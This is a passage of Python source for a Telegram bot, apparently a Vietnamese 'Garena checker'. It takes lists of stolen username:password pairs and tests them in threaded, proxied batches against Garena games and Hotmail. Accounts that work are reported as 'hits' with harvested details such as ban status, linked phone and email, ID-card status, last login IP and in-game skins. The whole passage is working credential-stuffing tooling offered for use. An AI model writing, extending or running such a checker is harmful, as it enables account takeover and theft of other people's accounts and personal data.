                            elif result_str in ["dead", "false", "fail", "invalid", "0", "die", "error"]:
                                is_hit = False
                        
                        message_val = result_data.get("message", "")
                        if message_val:
                            msg_lower = str(message_val).lower()
                            if any(word in msg_lower for word in ["thành công", "thanh cong", "success", "valid", "hit", "đúng", "dung", "live", "ok"]):
                                is_hit = True
                            elif any(word in msg_lower for word in ["thất bại", "that bai", "fail", "invalid", "dead", "sai", "không đúng", "khong dung", "die", "error"]):
                                is_hit = False
                        
                        data_val = result_data.get("data")
                        if data_val is not None:
                            if isinstance(data_val, (dict, list, str)) and data_val:
                                is_hit = True
                        
                        info_fields = ["uid", "id", "name", "nickname", "account", "info", "user", "player", "level", "rank", "email", "phone", "sdt"]
                        for field in info_fields:
                            if field in result_data and result_data[field] is not None and result_data[field] != "":
                                is_hit = True
                                break
                        
                        result_data["result"] = "hit" if is_hit else "dead"
                        
                        with cache_lock:
                            cache_results[cache_key] = result_data
                        return result_data
                    else:
                        result = {"result": "unknown"}
                        with cache_lock:
                            cache_results[cache_key] = result
                        return result
                        
                except json.JSONDecodeError:
                    text_lower = resp.text.lower()
                    if any(word in text_lower for word in ["success", "ok", "true", "hit", "valid", "live"]):
                        result = {"result": "hit"}
                    elif any(word in text_lower for word in ["fail", "false", "dead", "invalid", "error", "die"]):
                        result = {"result": "dead"}
                    else:
                        result = {"result": "unknown"}
                    
                    with cache_lock:
                        cache_results[cache_key] = result
                    return result
                    
            elif resp.status_code == 429:
                retry_after = resp.headers.get("Retry-After", "5")
                try:
                    wait_time = int(retry_after)
                except:
                    wait_time = 5 * (attempt + 1)
                time.sleep(wait_time)
                continue
            elif resp.status_code == 401:
                result = {"result": "error", "_error": "Invalid API credentials"}
                with cache_lock:
                    cache_results[cache_key] = result
                return result
            elif resp.status_code == 403:
                result = {"result": "error", "_error": "Forbidden access"}
                with cache_lock:
                    cache_results[cache_key] = result
                return result
            else:
                time.sleep(2)
                continue
                
        except requests.exceptions.Timeout:
            if attempt < DEFAULT_RETRIES - 1:
                time.sleep(3)
                continue
        except requests.exceptions.ConnectionError:
            if attempt < DEFAULT_RETRIES - 1:
                time.sleep(5)
                continue
        except Exception:
            if attempt < DEFAULT_RETRIES - 1:
                time.sleep(3)
                continue
    
    result = {"result": "error", "_error": "All retries failed"}
    with cache_lock:
        cache_results[cache_key] = result
    return result

# ========== FORMAT THÔNG TIN ĐẸP ==========
def format_hit_info(username, password, service, result_data):
    """Format thông tin hit đẹp - bỏ qua các field bị 0 hoặc lỗi"""
    service_desc = SERVICE_ROUTES.get(service, {}).get("desc", service)
    icon = SERVICE_ROUTES.get(service, {}).get("icon", "✅")
    
    line = "━━━━━━━━━━━━━━━━━━━━━━"
    
    msg = f"{line}\n{icon} <b>HIT - {service_desc}</b>\n{line}\n"
    msg += f"🔑 <b>Account:</b> <code>{username}:{password}</code>\n"
    
    if isinstance(result_data, dict):
        field_map = {
            "uid": ("👤 UID", "uid"),
            "name": ("👤 Name", "name"),
            "nickname": ("👤 Nickname", "nickname"),
            "region": ("🌐 Region", "region"),
            "shells": ("💰 Shells", "shells"),
            "so": ("💲 Sò", "so"),
            "nap_so": ("💰 Nạp sò", "nap_so"),
            "email_verified": ("📩 EMAIL", "email_verified"),
            "email": ("📩 EMAIL", "email"),
            "mobile_bound": ("📱 SĐT", "mobile_bound"),
            "phone": ("📱 SĐT", "phone"),
            "sdt": ("📱 SĐT", "sdt"),
            "fb": ("🔗 FB", "fb"),
            "fb_linked": ("🔗 FB", "fb_linked"),
            "password_set": ("🛡 PASS", "password_set"),
            "account_secured": ("🛡 Account Secured", "account_secured"),
            "banned": ("🚫 BAND", "banned"),
            "ban": ("🚫 BAND", "ban"),
            "aov_banned": ("🚫 BAND", "aov_banned"),
            "ban_until": ("🚫 BAND Đến", "ban_until"),
            "ban_expires": ("🚫 BAND Đến", "ban_expires"),
            "last_login": ("⏰ Login cuối", "last_login"),
            "garena_created": ("📅 Tạo GR", "garena_created"),
            "created_at": ("📅 Tạo GR", "created_at"),
            "server": ("🖥 Server", "server"),
            "aov_name": ("🔥 NAME", "aov_name"),
            "aov_rank": ("👑 RANK", "aov_rank"),
            "aov_level": ("✨ LEVEL", "aov_level"),
            "aov_total_skins": ("💎 SKIN", "aov_total_skins"),
            "aov_total_champs": ("💪 HERO", "aov_total_champs"),
            "aov_total_heroes": ("💪 HERO", "aov_total_heroes"),
            "aov_total_relationships": ("⚡️ QH", "aov_total_relationships"),
            "aov_ss": ("✨ SS", "aov_ss"),
            "aov_sss": ("🔥 SSS", "aov_sss"),
            "aov_anime": ("🔥 Anime", "aov_anime"),
            "aov_ss_list": ("✨ SS List", "aov_ss_list"),
            "aov_sss_list": ("🔥 SSS List", "aov_sss_list"),
            "aov_anime_list": ("🔥 Anime List", "aov_anime_list"),
            "aov_other": ("🎲 Other", "aov_other"),
            "aov_other_list": ("🎲 Other List", "aov_other_list"),
            "cccd": ("📄 CCCD", "cccd"),
            "authen": ("🛡 Authen", "authen"),
            "tinh_trang": ("📋 Tình Trạng", "tinh_trang"),
            "status_account": ("📋 Tình Trạng", "status_account"),
            "fc_name": ("🔥 FC Name", "fc_name"),
            "fc_uid": ("🆔 FC UID", "fc_uid"),
            "fc_ovr": ("📊 OVR", "fc_ovr"),
            "fc_level": ("✨ FC Level", "fc_level"),
            "fc_rank": ("👑 FC Rank", "fc_rank"),
            "last_session_ip": ("🌐 IP", "last_session_ip"),
            "last_session_country": ("🌍 Country", "last_session_country"),
            "ngay_tao_tk": ("📅 Ngày tạo TK", "ngay_tao_tk"),
            "ban_reason": ("🚫 Lý do Band", "ban_reason")
        }
        
        info_lines = []
        
        for key, (label, field) in field_map.items():
            if field in result_data and result_data[field] is not None and result_data[field] != "" and result_data[field] != "N/A":
                value = result_data[field]
                
                if isinstance(value, (int, float)) and value == 0:
                    continue
                if isinstance(value, str) and value in ["0", "00", "000"]:
                    continue
                
                if isinstance(value, str):
                    value = fix_encoding(value)
                
                if field in ["email_verified", "mobile_bound", "fb_linked", "password_set", "account_secured"]:
                    value = format_value(value)
                
                if field == "aov_banned":
                    if isinstance(value, str) and value.upper() == "NO":
                        value = "NO"
                    elif isinstance(value, bool):
                        value = "YES" if value else "NO"
                
                if isinstance(value, list):
                    if value:
                        value = "[" + ", ".join([fix_encoding(str(item)) for item in value]) + "]"
                    else:
                        continue
                
                if isinstance(value, tuple):
                    if value:
                        value = "[" + ", ".join([fix_encoding(str(item)) for item in value]) + "]"
                    else:
                        continue
                
                if field in ["banned", "ban", "aov_banned"]:
                    if isinstance(value, str) and value.upper() == "NO":
                        value = "NO"
                    elif isinstance(value, bool):
                        value = "YES" if value else "NO"
                    elif isinstance(value, str) and value.upper() == "YES":
                        value = "YES"
                
                if field in ["ban_until", "ban_expires"]:
                    if isinstance(value, str):
                        value = fix_encoding(value)
                        value = f"[{value}]"
                
                info_lines.append(f"{label}: {value}")
        
        skip_fields = set(field_map.keys())
        skip_fields.update(["result", "_is_hit", "_raw_response", "_error", "status", "success", "tk", "mk", "data", "message", "username"])
        
        for key, value in result_data.items():
            if key not in skip_fields and value is not None and value != "" and value != {} and value != []:
                if isinstance(value, (int, float)) and value == 0:
                    continue
                if isinstance(value, str) and value in ["0", "00", "000"]:
                    continue
                
                if isinstance(value, (str, int, float)):
                    label = key.replace("_", " ").title()
                    value = format_value(value)
                    if isinstance(value, str):
                        value = fix_encoding(value)
                    info_lines.append(f"▫️ {label}: {value}")
                elif isinstance(value, list) and value:
                    label = key.replace("_", " ").title()
                    list_value = "[" + ", ".join([fix_encoding(str(item)) for item in value]) + "]"
                    info_lines.append(f"▫️ {label}: {list_value}")
                elif isinstance(value, dict):
                    for sub_key, sub_value in value.items():
                        if sub_value is not None and sub_value != "" and sub_value != {} and sub_value != []:
                            if isinstance(sub_value, (str, int, float)):
                                if isinstance(sub_value, (int, float)) and sub_value == 0:
                                    continue
                                sub_label = sub_key.replace("_", " ").title()
                                sub_value = format_value(sub_value)
                                if isinstance(sub_value, str):
                                    sub_value = fix_encoding(sub_value)
                                info_lines.append(f"▫️ {sub_label}: {sub_value}")
        
        if info_lines:
            msg += "\n".join(info_lines)
            msg += f"\n{line}"
    
    return msg

# ========== CHECK ĐƠN ==========
def check_single(chat_id, username, password, service="lienquan"):
    """Kiểm tra một tài khoản"""
    service_desc = SERVICE_ROUTES.get(service, {}).get("desc", service)
    safe_send_message(chat_id, f"🔍 Dang check <code>{username}:{password}</code> voi {service_desc}...")
    
    result = check_account_api(username, password, service, use_delay=False)
    result_type = result.get("result", "unknown")
    
    save_result(username, password, result_type, service)
    
    if result_type == "hit":
        hit_msg = format_hit_info(username, password, service, result)
        safe_send_message(chat_id, hit_msg)
    elif result_type == "dead":
        safe_send_message(chat_id, f"❌ DEAD - {service_desc}\n🔑 {username}:{password}")
    else:
        safe_send_message(chat_id, f"⚠️ ERROR - {service_desc}\n🔑 {username}:{password}")

# ========== CHECK NHIỀU ==========
def check_batch(chat_id, accounts, service):
    """Kiểm tra nhiều tài khoản với delay và batch"""
    global checking, stats
    
    if checking:
        safe_send_message(chat_id, "⚠️ Dang check roi!")
        return
    
    checking = True
    stop_event.clear()
    
    total = len(accounts)
    stats = {
        "total": total,
        "checked": 0,
        "hits": 0,
        "dead": 0,
        "errors": 0,
        "unknown": 0,
        "start_time": time.time()
    }
    
    service_desc = SERVICE_ROUTES.get(service, {}).get("desc", service)
    icon = SERVICE_ROUTES.get(service, {}).get("icon", "🔍")
    
    with proxy_lock:
        proxy_count = len(proxy_list)
    
    safe_send_message(chat_id, f"""
{icon} <b>BAT DAU CHECK - V6.0</b>
📊 Tong: <code>{total}</code> accounts
🎯 Service: <b>{service_desc}</b>
⚡ Threads: <code>{CHECKMULTI_THREADS}</code>
⏱ Delay: <code>{CHECKMULTI_DELAY}s</code>
📦 Batch: <code>{CHECKMULTI_BATCH_SIZE}</code>
🌐 Proxy: <code>{proxy_count}</code>
""")
    
    batches = []
    for i in range(0, total, CHECKMULTI_BATCH_SIZE):
        batch = accounts[i:i + CHECKMULTI_BATCH_SIZE]
        batches.append(batch)
    
    total_batches = len(batches)
    batch_num = 0
    
    def process_single(user, pwd):
        """Xử lý một tài khoản"""
        if stop_event.is_set():
            return
        
        rate_limit(CHECKMULTI_DELAY)
        
        result = check_account_api(user, pwd, service, use_delay=False)
        result_type = result.get("result", "unknown")
        
        save_result(user, pwd, result_type, service)
        
        with stats_lock:
            stats["checked"] += 1
            
            if result_type == "hit":
                stats["hits"] += 1
                try:
                    hit_msg = format_hit_info(user, pwd, service, result)
                    safe_send_message(chat_id, hit_msg)
                except:
                    pass
            elif result_type == "dead":
                stats["dead"] += 1
            else:
                stats["errors"] += 1
    
    for batch in batches:
        if stop_event.is_set():
            break
        
        batch_num += 1
        
        with ThreadPoolExecutor(max_workers=CHECKMULTI_THREADS) as executor:
            futures = {executor.submit(process_single, user, pwd): (user, pwd) 
                       for user, pwd in batch}
            
            for future in as_completed(futures):
                if stop_event.is_set():
                    executor.shutdown(wait=False)
                    break
        
        elapsed = time.time() - stats["start_time"]
        speed = stats["checked"] / elapsed if elapsed > 0 else 0
        percent = (stats["checked"] / total) * 100
        
        safe_send_message(chat_id, f"""
📊 <b>TIEN DO - {stats['checked']}/{total}</b> ({percent:.1f}%)
✅ Hits: <code>{stats['hits']}</code>
❌ Dead: <code>{stats['dead']}</code>
⚡ Speed: <code>{speed:.1f}</code> acc/s
""")
        
        if batch_num < total_batches:
            time.sleep(CHECKMULTI_BATCH_DELAY)
    
    checking = False
    elapsed = time.time() - stats["start_time"]
    
    safe_send_message(chat_id, f"""
✅ <b>CHECK HOAN TAT!</b>
📊 Tong: <code>{stats['total']}</code>
🎯 HIT: <code>{stats['hits']}</code>
❌ DEAD: <code>{stats['dead']}</code>
⚠️ ERROR: <code>{stats['errors']}</code>
⏱ Thoi gian: <code>{elapsed:.1f}s</code>
""")
    
    if stats["hits"] > 0 and os.path.exists(OUTPUT_HITS):
        with open(OUTPUT_HITS, 'rb') as f:
            try:
                bot.send_document(chat_id, f, caption=f"✅ hits.txt ({stats['hits']} acc)")
            except:
                pass

# ========== CHECK ALL SERVICE ==========
def check_all_services(chat_id, accounts):
    """Kiểm tra tất cả service"""
    global checking
    
    if checking:
        safe_send_message(chat_id, "⚠️ Dang check roi!")
        return
    
    if not accounts:
        safe_send_message(chat_id, "❌ Khong co accounts!")
        return
    
    checking = True
    stop_event.clear()
    
    total_accounts = len(accounts)
    total_services = len(SERVICE_ROUTES)
    
    safe_send_message(chat_id, f"""
⚡ <b>CHECK TAT CA SERVICE</b>
📊 Accounts: <code>{total_accounts}</code>
📋 Services: <code>{total_services}</code>
""")
    
    stats_all = {
        "total": total_accounts * total_services,
        "checked": 0,
        "hits": 0,
        "dead": 0,
        "errors": 0,
        "start_time": time.time()
    }
    
    def process_all(user, pwd, service):
        """Xử lý một tài khoản với một service"""
        if stop_event.is_set():
            return
        
        rate_limit(DEFAULT_DELAY)
        
        result = check_account_api(user, pwd, service, use_delay=False)
        result_type = result.get("result", "unknown")
        
        save_result(user, pwd, result_type, service)
        
        with stats_lock:
            stats_all["checked"] += 1
            if result_type == "hit":
                stats_all["hits"] += 1
                try:
                    hit_msg = format_hit_info(user, pwd, service, result)
                    safe_send_message(chat_id, hit_msg)
                except:
                    pass
            elif result_type == "dead":
                stats_all["dead"] += 1
            else:
                stats_all["errors"] += 1
    
    all_tasks = [(user, pwd, service) for user, pwd in accounts for service in SERVICE_ROUTES.keys()]
    
    with ThreadPoolExecutor(max_workers=DEFAULT_THREADS) as executor:
        futures = {executor.submit(process_all, user, pwd, service): (user, pwd, service) 
                   for user, pwd, service in all_tasks}
        
        for future in as_completed(futures):
            if stop_event.is_set():
                executor.shutdown(wait=False)
                break
    
    checking = False
    elapsed = time.time() - stats_all["start_time"]
    
    safe_send_message(chat_id, f"""
✅ CHECK ALL HOAN TAT!
🎯 Hits: {stats_all['hits']}
❌ Dead: {stats_all['dead']}
⏱ Time: {elapsed:.1f}s
""")

# ========== XỬ LÝ LỆNH ==========
@bot.message_handler(commands=['start'])
def cmd_start(message):
    """Lệnh /start"""
    if not check_membership(message):
        return
    
    with proxy_lock:
        proxy_count = len(proxy_list)
    
    safe_send_message(message.chat.id, f"""
🤖 <b>GARENA CHECKER BOT V6.0 - BREAKTHROUGH</b>
👤 Admin: @baohuyno1
🌐 Proxy: {proxy_count}

📌 <b>LENH SU DUNG:</b>

<b>CHECK TAI KHOAN:</b>
/check user:pass - Check 1 acc
/check user|pass - Check 1 acc
/check user:pass service - Check 1 acc theo service
/checkmulti user1:pass1,user2:pass2 - Check nhieu acc
/checkall - Check tat ca acc dang cho

<b>SERVICE:</b>
lienquan, miniworld, blockmango, deltaforce, hotmail, fc, fullpack
""")

@bot.message_handler(commands=['check'])
def cmd_check(message):
    """Lệnh /check"""
    if not check_membership(message):
        return
    
    parts = message.text.split()
    if len(parts) < 2:
        safe_send_message(message.chat.id, """
❌ CACH DUNG:
/check user:pass
/check user|pass
/check user:pass lienquan
""")
        return
    
    account_str = parts[1]
    service = parts[2] if len(parts) > 2 else "lienquan"
    
    if service not in SERVICE_ROUTES:
        safe_send_message(message.chat.id, f"""
❌ SERVICE KHONG HOP LE!
Cac service: {', '.join(SERVICE_ROUTES.keys())}
""")
        return
    
    account_input = account_str.replace('|', ':')
    
    accounts, stats_loc = loc_tk_mk_only(account_input)
    
    if not accounts:
        safe_send_message(message.chat.id, "❌ Format sai! Dung: user:pass hoặc user|pass")
        return
    
    user, pwd = accounts[0]
    threading.Thread(target=check_single, args=(message.chat.id, user, pwd, service)).start()

@bot.message_handler(commands=['checkmulti'])
def cmd_checkmulti(message):
    """Lệnh /checkmulti"""
    if not check_membership(message):
        return
    
    text = message.text.strip()
    
    if text.startswith('/checkmulti'):
        text = text[len('/checkmulti'):].strip()
    
    if not text:
        safe_send_message(message.chat.id, """
❌ CACH DUNG:
/checkmulti user1:pass1
user2:pass2
user3|pass3
""")
        return
    
    lines = text.split('\n')
    service = "lienquan"
    
    if lines:
        last_line = lines[-1].strip()
        last_word = last_line.split()[-1] if last_line.split() else ""
        
        if last_word in SERVICE_ROUTES and len(last_line.split()) == 1:
            service = last_word
            lines = lines[:-1]
        elif last_word in SERVICE_ROUTES and len(last_line.split()) > 1:
            service = last_word
            lines[-1] = last_line.rsplit(last_word, 1)[0].strip()
    
    accounts_input = '\n'.join(lines)
    accounts_input = accounts_input.replace(',', '\n')
    accounts_input = accounts_input.replace('|', ':')
    
    accounts, stats_loc = loc_tk_mk_only(accounts_input)
    
    if not accounts:
        safe_send_message(message.chat.id, "❌ KHONG TIM THAY ACC HOP LE!")
        return
    
    total = len(accounts)
    
    safe_send_message(message.chat.id, f"""
📊 <b>CHECK NHIEU ACC - V6.0</b>
🎯 Tong: <code>{total}</code> accounts
🎮 Service: <b>{SERVICE_ROUTES[service]['desc']}</b>

Dang bat dau check...
""")
    
    threading.Thread(target=check_batch, args=(message.chat.id, accounts, service)).start()

@bot.message_handler(commands=['checkall'])
def cmd_checkall(message):
    """Lệnh /checkall"""
    if not check_membership(message):
        return
    
    global pending_accounts
    
    chat_id = message.chat.id
    if chat_id in pending_accounts and pending_accounts[chat_id]:
        accounts = pending_accounts[chat_id]
        pending_accounts[chat_id] = []
        threading.Thread(target=check_all_services, args=(chat_id, accounts)).start()
    else:
        safe_send_message(chat_id, "❌ Khong co acc nao dang cho!")

@bot.message_handler(commands=['proxy'])
def cmd_proxy(message):
    """Lệnh /proxy"""
    if not check_membership(message):
        return
    
    safe_send_message(message.chat.id, """
📤 <b>LOAD PROXY</b>

<b>Gửi file .txt với format:</b>
ip:port
hoặc
ip:port:user:pass
""")

@bot.message_handler(commands=['status'])
def cmd_status(message):
    """Lệnh /status"""
    if not check_membership(message):
        return
    
    if checking:
        elapsed = time.time() - stats.get("start_time", time.time())
        speed = stats["checked"] / elapsed if elapsed > 0 else 0
        with proxy_lock:
            proxy_count = len(proxy_list)
        safe_send_message(message.chat.id, f"""
📊 <b>TRANG THAI</b>
🔄 Dang check: YES
✅ Checked: {stats['checked']}/{stats['total']}
🎯 HIT: {stats['hits']}
❌ DEAD: {stats['dead']}
🌐 Proxy: {proxy_count}
⚡ Speed: {speed:.1f} acc/s
""")
    else:
        with proxy_lock:
            proxy_count = len(proxy_list)
        safe_send_message(message.chat.id, f"""
💤 Bot dang ranh
🌐 Proxy: {proxy_count}
""")

@bot.message_handler(commands=['stop'])
def cmd_stop(message):
    """Lệnh /stop"""
    if not check_membership(message):
        return
    
    stop_event.set()
    checking = False
    safe_send_message(message.chat.id, "🛑 Da dung check!")

@bot.message_handler(commands=['services'])
def cmd_services(message):
    """Lệnh /services"""
    if not check_membership(message):
        return
    
    msg = "📋 <b>DANH SACH SERVICE:</b>\n\n"
    for key, value in SERVICE_ROUTES.items():
        msg += f"{value['icon']} <b>{key}</b>: {value['desc']}\n"
    
    safe_send_message(message.chat.id, msg)

@bot.message_handler(commands=['hits'])
def cmd_hits(message):
    """Lệnh /hits"""
    if not check_membership(message):
        return
    
    try:
        with open(OUTPUT_HITS, 'rb') as f:
            bot.send_document(message.chat.id, f, caption="✅ hits.txt")
    except:
        safe_send_message(message.chat.id, "❌ Chua co hits!")

@bot.message_handler(commands=['dead'])
def cmd_dead(message):
    """Lệnh /dead"""
    if not check_membership(message):
        return
    
    try:
        with open(OUTPUT_DEAD, 'rb') as f:
            bot.send_document(message.chat.id, f, caption="❌ dead.txt")
    except:
        safe_send_message(message.chat.id, "❌ Chua co dead!")

@bot.message_handler(commands=['loc'])
def cmd_loc(message):
    """Lệnh /loc"""
    if not check_membership(message):
        return
    
    try:
        with open(OUTPUT_LOC, 'rb') as f:
            bot.send_document(message.chat.id, f, caption="📥 loc_accounts.txt")
    except:
        safe_send_message(message.chat.id, "❌ Chua co file loc!")

@bot.message_handler(commands=['report'])
def cmd_report(message):
    """Lệnh /report"""
    if not check_membership(message):
        return
    
    try:
        with open(OUTPUT_RESULT, 'rb') as f:
            bot.send_document(message.chat.id, f, caption="📊 report.txt")
    except:
        safe_send_message(message.chat.id, "❌ Chua co report!")

# ========== XỬ LÝ TEXT - KHÔNG GỬI THÔNG BÁO LỖI ==========
@bot.message_handler(content_types=['text'])
def handle_text(message):
    """Xử lý tin nhắn văn bản - im lặng nếu không tìm thấy acc"""
    if not check_membership(message):
        return
    
    global pending_accounts
    
    text = message.text.strip()
    chat_id = message.chat.id
    
    if text.startswith('/'):
        return
    
    text_input = text.replace('|', ':')
    
    accounts, stats_loc = loc_tk_mk_only(text_input)
    
    if not accounts:
        return
    
    if chat_id not in pending_accounts:
        pending_accounts[chat_id] = []
    pending_accounts[chat_id] = accounts
    save_loc_file(accounts)
    
    # Chỉ hiện tk:mk không kèm thời gian
    preview = '\n'.join([f"{u}:{p}" for u, p in accounts[:10]])
    total = len(accounts)
    
    msg = f"""
📊 DA LOC {total} ACCOUNTS

Preview (10 dong dau):
{preview}

👇 Dung lenh de check:
/checkall - Check tat ca service
/checkmulti user1:pass1,user2:pass2 service - Check service cu the
"""
    
    safe_send_message(chat_id, msg)

# ========== XỬ LÝ FILE ==========
@bot.message_handler(content_types=['document'])
def handle_document(message):
    """Xử lý file tài liệu"""
    if not check_membership(message):
        return
    
    global pending_accounts
    
    chat_id = message.chat.id
    
    try:
        if not message.document.file_name.endswith('.txt'):
            safe_send_message(chat_id, "❌ Chi ho tro file .txt!")
            return
        
        file_info = bot.get_file(message.document.file_id)
        content = bot.download_file(file_info.file_path).decode('utf-8', errors='ignore')
        
        # Kiểm tra proxy
        proxy_pattern = r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d{1,5}'
        if re.search(proxy_pattern, content):
            proxy_count = load_proxy_from_text(content)
            save_proxy_file()
            safe_send_message(chat_id, f"✅ LOAD PROXY THANH CONG!\n🌐 Tong proxy: {proxy_count}")
            return
        
        content_input = content.replace('|', ':')
        
        accounts, stats_loc = loc_tk_mk_only(content_input)
        
        if not accounts:
            safe_send_message(chat_id, "❌ Khong tim thay user:pass trong file!")
            return
        
        if chat_id not in pending_accounts:
            pending_accounts[chat_id] = []
        pending_accounts[chat_id] = accounts
        save_loc_file(accounts)
        
        # Chỉ hiện tk:mk
        preview = '\n'.join([f"{u}:{p}" for u, p in accounts[:20]])
        total = len(accounts)
        
        msg = f"""
✅ LOC XONG!
📊 Tong: {total} accounts

Preview (20 dong dau):
{preview}

👇 Dung lenh de check:
/checkall - Check tat ca service
/checkmulti user1:pass1,user2:pass2 service - Check service cu the
"""
        
        safe_send_message(chat_id, msg)
        
        with open(OUTPUT_LOC, 'rb') as f:
            try:
                bot.send_document(chat_id, f, caption=f"📥 loc_accounts.txt ({total} accounts)")
            except:
                pass
        
    except Exception as e:
        safe_send_message(chat_id, f"❌ Loi: {e}")

# ========== MAIN ==========
def main():
    """Hàm chính khởi động bot"""
    print("=" * 60)
    print("    GARENA CHECKER BOT V6.0 - BREAKTHROUGH")
    print("    ADMIN: @baohuyno1")
    print("    KENH BAT BUOC: @hakiiosvip")
    print("    WEB DASHBOARD: http://0.0.0.0:10000")
    print("=" * 60)
    
    while True:
        try:
            bot.polling(none_stop=True, interval=1, timeout=30)
        except Exception as e:
            print(f"[!] Loi: {e}")
            time.sleep(5)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Bot dung!")
        sys.exit(0)
